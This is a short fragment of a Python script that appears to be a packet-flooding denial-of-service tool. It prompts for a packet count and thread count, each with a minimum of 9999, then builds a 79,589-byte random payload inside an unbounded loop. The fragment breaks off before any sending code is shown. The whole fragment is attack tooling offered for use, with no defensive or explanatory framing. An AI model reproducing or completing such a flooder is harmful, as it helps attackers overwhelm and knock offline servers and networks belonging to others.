...
print("\033[31m━━━ Min Packet 9999")
times = int(input("┗━>\033[0m:"))
time.sleep(1)
print("\033[31m━━━ Threads")
print("\033[31m━━━ Min Threads 9999")
threads = int(input("┗━>\033[0m:"))
def xxxx():
  data = random._urandom(79589)
  i = random.choice(("[•]","[•]","[•]"))
  while True:
    try:
